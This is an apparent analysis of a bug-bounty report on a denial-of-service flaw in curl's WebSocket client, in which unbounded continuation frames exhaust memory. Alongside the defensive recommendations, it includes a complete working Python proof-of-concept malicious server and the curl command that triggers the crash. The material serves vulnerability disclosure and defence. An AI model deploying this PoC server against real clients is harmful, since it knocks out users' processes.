# WebSocket Fragmentation Denial of Service in Curl Client

## Metadata
- **Source:** HackerOne
- **Report:** 3303765 | https://hackerone.com/reports/3303765
- **Submitted:** 2025-08-18
- **Reporter:** pelioro
- **Program:** Curl
- **Bounty:** Not specified in writeup
- **Severity:** High
- **Vuln:** Denial of Service (DoS), Uncontrolled Resource Consumption, Memory Exhaustion, Improper Input Validation
- **CVEs:** None
- **Category:** memory-binary

## Summary
Curl's WebSocket implementation lacks bounds checking on continuation frames, allowing a malicious server to send an unbounded stream of fragmented message frames that cause the client to continuously allocate memory until exhaustion. An attacker controlling a WebSocket server can trigger remote denial of service against any curl client connecting to it.

## Attack scenario
1. Attacker sets up a malicious WebSocket server and advertises its address or tricks a user into connecting to it
2. Victim's curl client initiates WebSocket connection and completes the handshake with the malicious server
3. Malicious server sends an initial text frame with FIN=0 flag to indicate message fragmentation
4. Server then floods the client with continuation frames (opcode=0, FIN=0), each containing arbitrary payload data
5. Curl buffers all incoming continuation frames in memory, waiting for FIN=1 to signal message completion
6. Memory consumption grows unbounded until process crashes (OOM) or becomes unresponsive due to resource exhaustion

## Root cause
The WebSocket frame processing logic in curl lacks implementation of frame count limits or total message size limits for fragmented messages. The client unconditionally buffers continuation frames without validating that the message fragmentation is eventually terminated or respecting reasonable resource constraints.

## Attacker mindset
An attacker would exploit this to deny service to curl users connecting to their server. This is particularly effective for automated clients, monitoring tools, or bots that connect to untrusted WebSocket endpoints. The attack requires minimal effort (simple server implementation) and is universally effective against any vulnerable curl version.

## Defensive takeaways
- Implement maximum continuation frame count limits per WebSocket message (e.g., 10000 frames)
- Enforce maximum total message size limits regardless of fragmentation (e.g., 100MB)
- Add timeout mechanisms for incomplete fragmented messages to prevent indefinite buffering
- Validate FIN bits and opcode sequences according to RFC 6455 Section 5.4
- Monitor and alert on abnormal memory growth during WebSocket connections
- Consider rate limiting on incoming frames from a single connection
- Document WebSocket limitations and best practices for users connecting to untrusted servers

## Variant hunting
Check other HTTP clients (Python requests, Node.js http, Go net/http) for similar WebSocket fragmentation handling
Investigate if other frame types (binary frames, control frames) have similar issues
Test compressed WebSocket messages (permessage-deflate) for similar exhaustion vectors
Examine other protocol implementations that support message fragmentation (MQTT, AMQP) in curl or competing libraries
Look for similar patterns in other parsing code that may lack resource consumption bounds

## MITRE ATT&CK
- T1190
- T1498
- T1499

## Notes
RFC 6455 Section 5.4 specifies fragmentation behavior but does not mandate implementation limits, leaving it to implementers. This is a classic resource exhaustion vulnerability category (CWE-400). The PoC is straightforward and reproducible. Consider checking curl's version history to identify when this was fixed and backport status across distributions.

## Full report
<details><summary>Expand</summary>

### Summary
A malicious WebSocket server can send a fragmented message (FIN=0) followed by a flood of continuation frames, causing the client (curl) to continuously allocate memory while waiting for message completion. This can result in high memory usage and potential crash (OOM), representing a Denial-of-Service vulnerability.

---

### Description
The vulnerability occurs because curl does not limit the number of continuation frames for an unfinished WebSocket message. An attacker controlling a WebSocket server can send:

1. Initial text frame with `FIN=0` (indicating message continuation).  
2. An unbounded number of continuation frames (`opcode=0`, `FIN=0`).  

This causes curl to continuously buffer incoming data until memory is exhausted. The script `ws_frag_poc.py` demonstrates the behavior.

---

### Steps to Reproduce
1. Save the following PoC script as `ws_frag_poc.py`:

```python
#!/usr/bin/env python3
# ws_frag_poc.py - DoS PoC for WebSocket fragmentation
import socket, base64, hashlib, threading

HOST, PORT = "0.0.0.0", 8765

def make_handshake_response(key):
    GUID = b"258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
    accept = base64.b64encode(hashlib.sha1(key + GUID).digest()).decode()
    return (
        "HTTP/1.1 101 Switching Protocols\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        f"Sec-WebSocket-Accept: {accept}\r\n\r\n"
    ).encode()

def make_frame(fin, opcode, payload):
    first = (0x80 if fin else 0x00) | (opcode & 0x0f)
    plen = len(payload)
    header = bytes([first])
    if plen <= 125: header += bytes([plen])
    elif plen < 65536: header += bytes([126]) + plen.to_bytes(2, 'big')
    else: header += bytes([127]) + plen.to_bytes(8, 'big')
    return header + payload

def handle_client(conn, addr):
    data = conn.recv(4096)
    key = next((l.split(b":",1)[1].strip() for l in data.split(b"\r\n") if l.lower().startswith(b"sec-websocket-key:")), None)
    if not key: return conn.close()
    conn.sendall(make_handshake_response(key))
    conn.sendall(make_frame(fin=False, opcode=1, payload=b"X"*4))
    frag_payload = b"A"*32
    while True:
        conn.sendall(make_frame(fin=False, opcode=0, payload=frag_payload))

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(5)
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

if __name__ == "__main__":
    main()
```

2. Run the PoC:  
```bash
python3 ws_frag_poc.py
```

3. In another terminal, connect using curl:  
```bash
curl --include --no-buffer --output /dev/null ws://127.0.0.1:8765
```

4. Monitor memory usage:  
```bash
ps -o pid,rss,cmd -p <curl_pid>
top -p <curl_pid>
ps aux | grep curl
```

---

### Expected Result
Curl should handle fragmented messages without unbounded memory growth.

### Actual Result
Memory usage grows continuously, CPU spikes, process may hang or crash (OOM).

---

### Mitigation / Recommendation
- Implement limits on the number of continuation frames for unfinished WebSocket messages.  
- Consider maximum message size or memory allocation threshold to prevent client-side DoS.  
- Add proper validation of FIN/fragmented frames in the WebSocket implementation.

---

### References
- [RFC 6455 - The WebSocket Protocol](https://datatracker.ietf.org/doc/html/rfc6455)
- CWE-400: Uncontrolled Resource Consumption

## Impact

- High memory consumption on the client.  
- Potential crash or process termination (OOM) in curl.  
- Can be triggered remotely if the client connects to a malicious WebSocket server.

</details>

---
*Analysed by Claude on 2026-05-24*
